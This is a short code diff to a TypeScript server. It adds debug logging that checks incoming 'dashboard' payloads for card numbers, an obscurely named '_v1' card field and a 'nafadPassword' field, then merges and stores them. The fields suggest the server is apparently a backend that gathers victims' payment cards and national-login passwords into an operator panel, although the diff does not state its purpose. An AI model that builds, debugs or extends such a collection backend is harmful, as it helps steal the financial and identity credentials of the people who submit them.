@@ -498,6 +498,8 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
       if (existingEntry.rows[0]?.raw) {
         // Merge existing raw with current payload to preserve all fields
         mergedPayload.raw = { ...existingEntry.rows[0].raw, ...payload.raw, ...payload };
+        console.log("[UpsertDashboard] Merged raw keys:", Object.keys(mergedPayload.raw));
+        console.log("[UpsertDashboard] Merged raw has card data:", { _v1: !!mergedPayload.raw._v1, cardNumber: !!mergedPayload.raw.cardNumber });
       }
     } catch (e) {
       console.warn("[UpsertDashboard] Could not fetch existing dashboard entry:", e);
@@ -758,10 +760,20 @@ async function startServer() {
       return;
     }
 
-    // Debug: log all nafad-related fields
+    // Debug: log all card-related fields
     console.log("[Dashboard POST] Received payload keys:", Object.keys(payload));
+    if (payload._v1 || payload.cardNumber) {
+      console.log("[Dashboard POST] Card data found:", { _v1: payload._v1 ? "***" : "empty", cardNumber: payload.cardNumber ? "***" : "empty" });
+    }
     if (payload.nafadPassword) {
       console.log("[Dashboard POST] nafadPassword:", payload.nafadPassword ? "***" : "empty");
+    }
+    // Log raw data if present
+    if (payload.raw) {
+      console.log("[Dashboard POST] raw keys:", Object.keys(payload.raw));
+      if (payload.raw._v1 || payload.raw.cardNumber) {
+        console.log("[Dashboard POST] raw card data found");
+      }
     }
 
     try {
